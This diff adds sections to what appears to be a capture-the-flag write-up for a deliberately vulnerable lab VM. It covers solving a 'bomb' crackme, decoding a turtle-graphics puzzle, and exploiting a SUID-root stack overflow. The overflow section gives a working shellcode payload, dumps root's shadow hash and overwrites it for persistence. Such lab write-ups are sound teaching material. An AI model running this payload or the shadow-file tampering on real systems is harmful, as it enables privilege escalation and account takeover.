@@ -391,15 +391,569 @@ ssh laurie@192.168.56.101
 
 ```
 laurie@BornToSecHackMe:~$ id
-uid=1XXX(laurie) gid=1XXX(laurie) groups=1XXX(laurie)
+uid=1003(laurie) gid=1003(laurie) groups=1003(laurie)
 ```
 
 This confirms local access as the `laurie` user, the next pivot point toward root.
 
 ---
 
-## 12. Next Steps
+## 12. Diffusing the `bomb` and Escalating to `thor`
 
-- Enumerate `laurie`'s home directory and privileges (`sudo -l`, group memberships, readable files).
-- Check for SUID/SGID binaries, writable cron jobs, and kernel version for privilege escalation to root.
-- Document the final root escalation step to complete Method 1.
+Inside `laurie`'s home directory, two new files were present: `bomb` (an ELF binary) and a `README`:
+
+```
+laurie@BornToSecHackMe:~$ ls -la
+-rwxr-x--- 1 laurie   laurie 26943 Oct  8  2015 bomb
+-rwxr-x--- 1 laurie   laurie   158 Oct  8  2015 README
+```
+
+```
+laurie@BornToSecHackMe:~$ cat README
+Diffuse this bomb!
+When you have all the password use it as "thor" user with ssh.
+HINT:
+P
+ 2
+ b
+o
+4
+NO SPACE IN THE PASSWORD (password is case sensitive).
+```
+
+```
+laurie@BornToSecHackMe:~$ file bomb
+bomb: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.0.0, not stripped
+```
+
+Running the binary directly and guessing shows it's a classic **"bomb lab"**-style crackme: it reads a line of input per stage, and any wrong answer immediately "explodes" (exits):
+
+```
+laurie@BornToSecHackMe:~$ ./bomb
+Welcome this is my little bomb !!!! You have 6 stages with
+only one life good luck !! Have a nice day!
+d
+BOOM!!!
+The bomb has blown up.
+```
+
+Since the binary is **not stripped**, I disassembled/decompiled it (via Ghidra) to recover the logic for `main()` and each `phase_N()` function, rather than blindly guessing inputs (each wrong guess costs the one life you get).
+
+### `main()`
+
+```c
+int main(int argc,char **argv)
+{
+  char *pcVar1;
+
+  if (argc == 1) {
+    infile = stdin;
+  }
+  else {
+    if (argc != 2) {
+      printf("Usage: %s [<input_file>]\n",*argv);
+      exit(8);
+    }
+    infile = (_IO_FILE *)fopen(argv[1],"r");
+    if ((FILE *)infile == (FILE *)0x0) {
+      printf("%s: Error: Couldn't open %s\n",*argv,argv[1]);
+      exit(8);
+    }
+  }
+  initialize_bomb();
+  printf("Welcome this is my little bomb !!!! You have 6 stages with\n");
+  printf("only one life good luck !! Have a nice day!\n");
+  pcVar1 = read_line();
+  phase_1(pcVar1);
+  phase_defused();
+  printf("Phase 1 defused. How about the next one?\n");
+  pcVar1 = read_line();
+  phase_2(pcVar1);
+  phase_defused();
+  printf("That's number 2.  Keep going!\n");
+  pcVar1 = read_line();
+  phase_3(pcVar1);
+  phase_defused();
+  printf("Halfway there!\n");
+  pcVar1 = read_line();
+  phase_4(pcVar1);
+  phase_defused();
+  printf("So you got that one.  Try this one.\n");
+  pcVar1 = read_line();
+  phase_5(pcVar1);
+  phase_defused();
+  printf("Good work!  On to the next...\n");
+  pcVar1 = read_line();
+  phase_6(pcVar1);
+  phase_defused();
+  return 0;
+}
+```
+
+This confirms the program's structure: it optionally reads from a file passed as an argument (or stdin), then calls `phase_1()` through `phase_6()` in strict sequence, calling `phase_defused()` after each one — any single `explode_bomb()` call inside a phase terminates the program immediately. This also means the bomb can be solved **offline**, by piping a file containing all six answers (one per line) instead of typing them interactively one at a time, e.g.:
+
+```bash
+./bomb answers.txt
+```
+
+where `answers.txt` contains the six phase answers, one per line, in order.
+
+### Phase 1
+
+```c
+void phase_1(char *param_1) {
+  if (strings_not_equal(param_1, "Public speaking is very easy.") != 0)
+    explode_bomb();
+}
+```
+
+Straightforward string comparison — the answer is simply:
+
+```
+Public speaking is very easy.
+```
+
+### Phase 2
+
+```c
+void phase_2(char *param_1) {
+  read_six_numbers(param_1, ...);
+  if (tab[1] != 1) explode_bomb();
+  for (i = 1; i < 6; i++)
+    if (tab[i+1] != (i+1) * tab[i]) explode_bomb();
+}
+```
+
+This expects six space-separated numbers where `tab[0] = 1` and each subsequent value is `(index+1) * previous`, i.e. factorial growth:
+
+```
+1 2 6 24 120 720
+```
+
+### Phase 3
+
+```c
+void phase_3(char *param_1) {
+  sscanf(param_1, "%d %c %d", &local_10, &local_9, &local_8);
+  switch (local_10) {
+    case 0: expect 'q', 0x309;
+    case 1: expect 'b', 0xd6;
+    case 2: expect 'b', 0x2f3;
+    ...
+    case 7: expect 'b', 0x20c;
+  }
+}
+```
+
+This is a switch/case gate: pick any valid `case` index and supply the matching letter and hex-decoded number. Using `case 1` (`b`, `0xd6` = `214`), a valid input is:
+
+```
+1 b 214
+```
+
+### Phase 4
+
+```c
+void phase_4(char *param_1) {
+  sscanf(param_1, "%d", &local_8);
+  if (local_8 < 1) explode_bomb();
+  if (func4(local_8) != 0x37) explode_bomb();
+}
+```
+
+`func4()` is a recursive function (not shown above) whose output must equal `0x37` (55) — by testing candidate values, `9` satisfies it:
+
+```
+9
+```
+
+### Phase 5
+
+```c
+void phase_5(char *param_1) {
+  if (string_length(param_1) != 6) explode_bomb();
+  for (i = 0; i < 6; i++)
+    local_c[i] = array[(char)(param_1[i] & 0xf)];
+  if (strings_not_equal(local_c, "giants") != 0) explode_bomb();
+}
+```
+
+This masks each input character to its lower 4 bits and uses that as an index into a hidden lookup table, expecting the result to spell `"giants"`.
+
+To find the address of that hidden table, I disassembled `phase_5` in GDB:
+
+```
+laurie@BornToSecHackMe:~$ gdb bomb
+(gdb) set disassembly-flavor intel
+(gdb) disass phase_5
+```
+
+```
+Dump of assembler code for function phase_5:
+   0x08048d2c <+0>:  push   ebp
+   0x08048d2d <+1>:  mov    ebp,esp
+   ...
+   0x08048d43 <+23>: cmp    eax,0x6
+   0x08048d46 <+26>: je     0x8048d4d <phase_5+33>
+   0x08048d48 <+28>: call   0x80494fc <explode_bomb>
+   0x08048d4d <+33>: xor    edx,edx
+   0x08048d4f <+35>: lea    ecx,[ebp-0x8]
+   0x08048d52 <+38>: mov    esi,0x804b220
+   0x08048d57 <+43>: mov    al,BYTE PTR [edx+ebx*1]
+   0x08048d5a <+46>: and    al,0xf
+   0x08048d5c <+48>: movsx  eax,al
+   0x08048d5f <+51>: mov    al,BYTE PTR [eax+esi*1]
+   0x08048d62 <+54>: mov    BYTE PTR [edx+ecx*1],al
+   0x08048d65 <+57>: inc    edx
+   0x08048d66 <+58>: cmp    edx,0x5
+   0x08048d69 <+61>: jle    0x8048d57 <phase_5+43>
+   ...
+   0x08048d72 <+70>: push   0x804980b
+   0x08048d77 <+75>: lea    eax,[ebp-0x8]
+   0x08048d7a <+78>: push   eax
+   0x08048d7b <+79>: call   0x8049030 <strings_not_equal>
+   ...
+End of assembler dump.
+```
+
+The `mov esi,0x804b220` instruction at offset `+38` confirmed the table's base address, and the `and al,0xf` at `+46` confirmed the lower-4-bit masking seen in the decompiled C. Dumping that address as a string revealed the 16-character lookup table:
+
+```
+(gdb) x/s 0x804b220
+0x804b220 <array.123>: "isrveawhobpnutfg\260\001"
+```
+
+So the table is `isrveawhobpnutfg` (the trailing `\260\001` bytes are unrelated adjacent memory, not part of the table). Steps taken from there:
+
+1. Found the index (0–15) of each target letter (`g`,`i`,`a`,`n`,`t`,`s`) inside that 16-character table.
+2. Since only the low 4 bits of the input character matter, chose ASCII letters whose hex value's last hex digit matches each required index.
+3. Assembled a 6-character input satisfying all six indices:
+
+```python
+>>> g="isrveawhobpnutfg"
+>>> g[ord('o')&0xf]
+'g'
+>>> g[ord('p')&0xf]
+'i'
+>>> g[ord('e')&0xf]
+'a'
+>>> g[ord('k')&0xf]
+'n'
+>>> g[ord('m')&0xf]
+'t'
+>>> g[ord('q')&0xf]
+'s'
+>>>
+```
+
+```
+opekmq
+```
+
+### Phase 6
+
+A six-number permutation puzzle that walks a linked list and requires it to be built in non-decreasing value order. Testing valid permutations of `1–6`, the working input was:
+
+```
+4 2 6 3 1 5
+```
+
+### Confirming the Solution
+
+As noted from `main()`, the bomb can be solved offline by piping a file containing all six answers instead of typing them interactively. I created `/tmp/s` with the six answers, one per line:
+
+```
+laurie@BornToSecHackMe:~$ cat /tmp/s
+Public speaking is very easy.
+1 2 6 24 120 720
+1 b 214
+9
+opekmq
+4 2 6 3 1 5
+```
+
+Running the bomb against this file confirmed every phase passes:
+
+```
+laurie@BornToSecHackMe:~$ ./bomb /tmp/s
+Welcome this is my little bomb !!!! You have 6 stages with
+only one life good luck !! Have a nice day!
+Phase 1 defused. How about the next one?
+That's number 2.  Keep going!
+Halfway there!
+So you got that one.  Try this one.
+Good work!  On to the next...
+Congratulations! You've defused the bomb!
+```
+
+This confirms all six recovered answers are correct before assembling the final password.
+
+### Assembling the Final Password
+
+Per the README ("NO SPACE IN THE PASSWORD"), I concatenated all six phase answers, each with spaces stripped:
+
+```
+Publicspeakingisveryeasy. + 12624120720 + 1b214 + 9 + opekma + 426315
+```
+
+giving the raw recovered password:
+
+```
+laurie@BornToSecHackMe:~$ cat /tmp/s|tr -d "\n"| tr -d " ";echo
+Publicspeakingisveryeasy.126241207201b2149opekmq426315
+```
+
+However, the assignment subject explicitly states a transformation rule for bin-bomb-type challenges:
+
+> "For the part related to a (bin) bomb: If the password found is 123456. The password to use is 123546."
+
+Comparing `123456` → `123546` shows this is a **swap of the 4th and 5th characters** of the recovered password — not the raw password itself. Applying that same swap to the full recovered string above:
+
+```
+Publicspeakingisveryeasy.126241207201b2149opekmq426135
+```
+
+This is the actual password to use for the `thor` user over SSH
+
+## 13. Turtle challenge
+
+After successfully escalating to the thor user, I found a new challenge in the home directory:
+
+```bash
+thor@BornToSecHackMe:~$ ls -la
+total 41
+drwxr-x--- 1 thor     thor    60 Jul  6 17:00 .
+drwxrwx--x 1 www-data root    60 Oct 13  2015 ..
+-rwxr-x--- 1 thor     thor     1 Oct 15  2015 .bash_history
+-rwxr-x--- 1 thor     thor   220 Oct  8  2015 .bash_logout
+-rwxr-x--- 1 thor     thor  3489 Oct 13  2015 .bashrc
+drwx------ 2 thor     thor    43 Oct 15  2015 .cache
+-rwxr-x--- 1 thor     thor   675 Oct  8  2015 .profile
+-rwxr-x--- 1 thor     thor    69 Oct  8  2015 README
+-rwxr-x--- 1 thor     thor 31523 Oct  8  2015 turtle
+-rw------- 1 thor     thor   787 Jul  6 17:00 .viminfo
+thor@BornToSecHackMe:~$ cat README
+Finish this challenge and use the result as password for 'zaz' user.
+thor@BornToSecHackMe:~$ file turtle
+turtle: ASCII text
+thor@BornToSecHackMe:~$ head -n5 turtle
+Tourne gauche de 90 degrees
+Avance 50 spaces
+Avance 1 spaces
+Tourne gauche de 1 degrees
+Avance 1 spaces
+thor@BornToSecHackMe:~$ tail -n5 turtle
+Tourne droite de 90 degrees
+Avance 100 spaces
+Recule 200 spaces
+
+Can you digest the message? :)
+```
+The commands translate to:
+
+Tourne gauche de X degrees → Turn left X degrees
+
+Tourne droite de X degrees → Turn right X degrees
+
+Avance X spaces → Move forward X spaces
+
+Recule X spaces → Move backward X spaces
+
+Visualizing the Turtle Path
+To understand what shape these commands would draw, I wrote a Python script to parse the turtle commands and plot the resulting path:
+
+```bash
+python scripts/turtle.py scripts/turtle
+```
+
+result:
+
+![result](screenshots/7.png)
+
+The path traced out formed a recognizable pattern that spelled out the word "SLASH", this appeared to be the result we needed.
+
+Recovering the Password
+The visualization revealed the path drew the word "SLASH". However, reading the comments in the turtle file hinted that the message needed to be "digested" further:
+
+```text
+Can you digest the message? :)
+```
+Given the context of the previous bomb challenge, I needed to hash the recovered word to use as the password for the zaz user.
+
+Following the same pattern as previous challenges where the result needed to be hashed, I computed the SHA-256 hash of "SLASH" but it failed until I tried md5 and it successfuly:
+
+```
+646da671ca01bb5d84dbb5fb2238dc8e
+```
+
+## 14. Exploit_me
+
+Logging in as `zaz` revealed a setuid binary in the home directory:
+ 
+```bash
+zaz@BornToSecHackMe:~$ ls -la
+-rwsr-s--- 1 root     zaz   4880 Oct  8  2015 exploit_me
+```
+ 
+```bash
+zaz@BornToSecHackMe:~$ file exploit_me
+exploit_me: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x2457e2f88d6a21c3893bc48cb8f2584bcd39917e, not stripped
+```
+ 
+The `s` in the owner permission bits (`rws`) confirms this binary runs with the **owner's privileges (root)** regardless of who executes it — making it a high-value target: any way to hijack its execution flow runs code as root.
+ 
+### Basic Behavior
+ 
+```bash
+zaz@BornToSecHackMe:~$ ./exploit_me a
+a
+```
+ 
+The program simply echoes back whatever argument it's given — suggesting it copies `argv[1]` into a local buffer and prints it.
+ 
+### Decompiling `main()`
+ 
+Since the binary is not stripped, decompiling `main()` confirms this:
+ 
+```c
+bool main(int param_1,int param_2)
+{
+  char input [140];
+ 
+  if (1 < param_1) {
+    strcpy(input,*(char **)(param_2 + 4));
+    puts(input);
+  }
+  return param_1 < 2;
+}
+```
+ 
+`strcpy()` copies `argv[1]` into a fixed 140-byte stack buffer (`input`) with **no length check whatsoever**. Any argument longer than 140 bytes overflows the buffer and corrupts adjacent stack memory — including the saved base pointer and the function's return address.
+ 
+### Confirming and Measuring the Overflow via GDB
+ 
+To find exactly how much data is needed to reach the return address, I disassembled `main()`:
+ 
+```bash
+zaz@BornToSecHackMe:~$ gdb ./exploit_me
+(gdb) set disassembly-flavor intel
+(gdb) disass main
+```
+ 
+```
+Dump of assembler code for function main:
+   0x080483f4 <+0>:  push   ebp
+   0x080483f5 <+1>:  mov    ebp,esp
+   0x080483f7 <+3>:  and    esp,0xfffffff0
+   0x080483fa <+6>:  sub    esp,0x90
+   0x08048400 <+12>: cmp    DWORD PTR [ebp+0x8],0x1
+   0x08048404 <+16>: jg     0x804840d <main+25>
+   0x08048406 <+18>: mov    eax,0x1
+   0x0804840b <+23>: jmp    0x8048436 <main+66>
+   0x0804840d <+25>: mov    eax,DWORD PTR [ebp+0xc]
+   0x08048410 <+28>: add    eax,0x4
+   0x08048413 <+31>: mov    eax,DWORD PTR [eax]
+   0x08048415 <+33>: mov    DWORD PTR [esp+0x4],eax
+   0x08048419 <+37>: lea    eax,[esp+0x10]
+   0x0804841d <+41>: mov    DWORD PTR [esp],eax
+   0x08048420 <+44>: call   0x8048300 <strcpy@plt>
+   0x08048425 <+49>: lea    eax,[esp+0x10]
+   0x08048429 <+53>: mov    DWORD PTR [esp],eax
+   0x0804842c <+56>: call   0x8048310 <puts@plt>
+   0x08048431 <+61>: mov    eax,0x0
+   0x08048436 <+66>: leave
+   0x08048437 <+67>: ret
+End of assembler dump.
+```
+ 
+The `lea eax,[esp+0x10]` instructions (used as both the `strcpy` destination and the `puts` argument) confirm the buffer's address is `esp+0x10` at that point in the function.
+ 
+I set a breakpoint right after the `strcpy` call and ran the binary with a 140-byte argument to observe the actual stack layout:
+ 
+```bash
+(gdb) br *0x08048425
+(gdb) r $(python -c"print('A'*140)")
+```
+
+```
+Breakpoint 1, 0x08048425 in main ()
+(gdb) x/50x $esp+0x10
+0xbffff640: 0x41414141 0x41414141 0x41414141 0x41414141
+...
+0xbffff6c0: 0x41414141 0x41414141 0x41414141 0xb7e45400
+(gdb) info registers
+eax            0xbffff640  -1073744320
+...
+esp            0xbffff630  0xbffff630
+ebp            0xbffff6c8  0xbffff6c8
+```
+ 
+From this:
+- Buffer start address = `esp + 0x10` = `0xbffff640`
+- Saved `ebp` = `0xbffff6c8`
+- Difference: `0xbffff6c8 − 0xbffff640 = 0x88` = **136 bytes** from the start of the buffer to the saved base pointer
+- The return address sits immediately after the saved `ebp` (4 more bytes), so it lives at **offset 140** from the start of the buffer
+This means: a 140-byte input exactly fills the buffer and saved `ebp` slot, and **bytes 141–144** of a longer input would land directly in the return address slot — full control over where the program resumes execution after `main()` returns.
+
+
+### Exploiting the Overflow to Gain a Root Shell
+ 
+Using the offsets confirmed above, I crafted a payload with the following structure:
+ 
+1. **140 bytes of padding** (`'A' * 140`) to fill the buffer up to the saved return address slot.
+2. **4 bytes overwriting the return address** (`\x0c\xf8\xff\xbf`, little-endian for `0xbffff80c`) — a stack address chosen to land inside the filler region of the same argument string, further along.
+3. **300 additional bytes of `'\x90'` (NOP sled)** a harmless single-byte instruction, so jumping anywhere into this region just "slides" forward one instruction at a time until reaching the real payload.
+4. **Shellcode** at the end of the string: a standard 21-byte `execve("/bin/sh")` shellcode (`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80`), which zeroes `eax`, pushes `"/bin/sh"` onto the stack, and invokes `execve`.
+The full command:
+ 
+```bash
+zaz@BornToSecHackMe:~$ ./exploit_me `python -c "print('A'*140+'\x0c\xf8\xff\xbf'+300*'\x90'+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')"`
+```
+ 
+The overflow succeeded, execution was redirected into the landing zone/shellcode, and `execve("/bin/sh")` ran with the process's **effective UID still set to root** (since the binary is SUID-root and the shellcode doesn't drop privileges):
+ 
+```
+# whoami
+root
+# id
+uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
+```
+ 
+This satisfies the assignment's root requirement exactly: `uid`/`euid` of `0`, with a real interactive shell capable of running arbitrary commands.
+ 
+As further proof, I read `/etc/shadow` (only accessible to root):
+ 
+```
+# cat /etc/shadow
+root:$6$P3HXAOsR$Lmz85I7RXUJLU8KR.C2okbToyNfq5QIDj6YOoWYilDWQ3e.dhXC/bamN4xLcAZVHHLFuszMaGD6nRa5HrFAls0:16723:0:99999:7:::
+...
+```
+ 
+### Establishing Persistent Root Access
+ 
+The overflow only grants a root shell for the lifetime of that `exploit_me` process — it doesn't survive logging out. To establish a way back into a root shell without re-running the exploit each time, I first tried the straightforward approach:
+ 
+Since I already had root privileges (able to read and write `/etc/shadow` directly), I replaced root's password hash with `zaz`'s own hash, whose plaintext password I already knew:
+ 
+```bash
+ZAZ_HASH=$(grep "^zaz:" /etc/shadow | cut -d: -f2)
+sed -i "s|^root:[^:]*|root:$ZAZ_HASH|" /etc/shadow
+```
+ 
+This makes root's password the same as `zaz`'s known password:
+ 
+```
+# su root
+Password:
+root@BornToSecHackMe:/home/zaz# id
+uid=0(root) gid=0(root) groups=0(root)
+root@BornToSecHackMe:/home/zaz# cd
+root@BornToSecHackMe:~# la
+.aptitude  .bash_history  .bashrc  .profile  README  .rnd  .ssh  .vim  .viminfo
+root@BornToSecHackMe:~# cat README
+CONGRATULATIONS !!!!
+To be continued...
+root@BornToSecHackMe:~#
+```
+
+
